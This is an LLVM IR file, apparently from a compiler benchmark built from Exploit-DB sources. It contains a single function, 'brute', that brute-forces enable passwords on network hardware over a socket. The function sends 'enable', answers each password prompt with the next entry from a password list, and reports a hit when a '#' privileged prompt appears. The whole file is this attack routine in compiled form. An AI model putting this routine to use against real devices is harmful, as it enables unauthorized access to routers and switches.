; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_254.c_brute.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_254.c_brute.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@sock_stat = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"enable\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@n = common dso_local global i32 0, align 4
@x = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [69 x i8] c"%s %i passwords tried. no valid password found in the passlist\0A\1B[0m\0A\00", align 1
@BOX = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"%s possible password found: %s\0A\1B[0m\0A\00", align 1
@password = common dso_local global i8** null, align 8
@.str.7 = private unnamed_addr constant [25 x i8] c"%s %s... wrong password\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [9 x i8] c"enable\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @brute() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = call i8* @malloc(i32 100)
  store i8* %3, i8** %1, align 8
  %4 = load i8*, i8** %1, align 8
  %5 = call i32 @bzero(i8* %4, i32 100)
  %6 = load i32, i32* @sock_stat, align 4
  %7 = call i32 @write(i32 %6, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 6)
  %8 = load i32, i32* @sock_stat, align 4
  %9 = call i32 @write(i32 %8, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 2)
  br label %10

10:                                               ; preds = %0, %97, %109
  br label %11

11:                                               ; preds = %45, %10
  %12 = load i32, i32* @sock_stat, align 4
  %13 = load i8*, i8** %1, align 8
  %14 = call i64 @read(i32 %12, i8* %13, i32 100)
  %15 = icmp sgt i64 %14, 0
  br i1 %15, label %16, label %48

16:                                               ; preds = %11
  %17 = load i32, i32* @n, align 4
  %18 = load i32, i32* @x, align 4
  %19 = icmp eq i32 %17, %18
  br i1 %19, label %20, label %26

20:                                               ; preds = %16
  %21 = load i8*, i8** @BOX, align 8
  %22 = load i32, i32* @n, align 4
  %23 = sub nsw i32 %22, 1
  %24 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.2, i64 0, i64 0), i8* %21, i32 %23)
  %25 = call i32 @exit(i32 0) #3
  unreachable

26:                                               ; preds = %16
  %27 = load i32, i32* @n, align 4
  %28 = add nsw i32 %27, 1
  %29 = load i32, i32* @x, align 4
  %30 = icmp eq i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %26
  br label %48

32:                                               ; preds = %26
  %33 = load i8*, i8** %1, align 8
  %34 = call i64 @strstr(i8* %33, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %44, label %36

36:                                               ; preds = %32
  %37 = load i8*, i8** %1, align 8
  %38 = call i64 @strstr(i8* %37, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %44, label %40

40:                                               ; preds = %36
  %41 = load i8*, i8** %1, align 8
  %42 = call i64 @strstr(i8* %41, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %40, %36, %32
  br label %48

45:                                               ; preds = %40
  %46 = load i8*, i8** %1, align 8
  %47 = call i32 @bzero(i8* %46, i32 100)
  br label %11

48:                                               ; preds = %44, %31, %11
  %49 = load i8*, i8** %1, align 8
  %50 = call i64 @strstr(i8* %49, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %62

52:                                               ; preds = %48
  %53 = load i8*, i8** @BOX, align 8
  %54 = load i8**, i8*** @password, align 8
  %55 = load i32, i32* @n, align 4
  %56 = sub nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8*, i8** %54, i64 %57
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i8* %53, i8* %59)
  %61 = call i32 @exit(i32 0) #3
  unreachable

62:                                               ; preds = %48
  %63 = load i8*, i8** %1, align 8
  %64 = call i64 @strstr(i8* %63, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %100

66:                                               ; preds = %62
  %67 = load i32, i32* @sock_stat, align 4
  %68 = load i8**, i8*** @password, align 8
  %69 = load i32, i32* @n, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8*, i8** %68, i64 %70
  %72 = load i8*, i8** %71, align 8
  %73 = load i8**, i8*** @password, align 8
  %74 = load i32, i32* @n, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8*, i8** %73, i64 %75
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @write(i32 %67, i8* %72, i32 %78)
  %80 = load i32, i32* @sock_stat, align 4
  %81 = call i32 @write(i32 %80, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32 2)
  %82 = load i32, i32* @n, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* @n, align 4
  %84 = load i8*, i8** %1, align 8
  %85 = call i32 @bzero(i8* %84, i32 100)
  %86 = load i32, i32* @n, align 4
  %87 = icmp sgt i32 %86, 1
  br i1 %87, label %88, label %97

88:                                               ; preds = %66
  %89 = load i8*, i8** @BOX, align 8
  %90 = load i8**, i8*** @password, align 8
  %91 = load i32, i32* @n, align 4
  %92 = sub nsw i32 %91, 2
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %90, i64 %93
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 (i8*, i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i8* %89, i8* %95)
  br label %97

97:                                               ; preds = %88, %66
  %98 = load i32, i32* @stdout, align 4
  %99 = call i32 @fflush(i32 %98)
  br label %10

100:                                              ; preds = %62
  %101 = load i8*, i8** %1, align 8
  %102 = call i64 @strstr(i8* %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  %103 = icmp ne i64 %102, 0
  br i1 %103, label %104, label %109

104:                                              ; preds = %100
  %105 = load i32, i32* @sock_stat, align 4
  %106 = call i32 @write(i32 %105, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.8, i64 0, i64 0), i32 8)
  %107 = load i8*, i8** %1, align 8
  %108 = call i32 @bzero(i8* %107, i32 100)
  br label %109

109:                                              ; preds = %104, %100
  br label %10
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i64 @read(i32, i8*, i32) #1

declare dso_local i32 @printf(i8*, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fflush(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
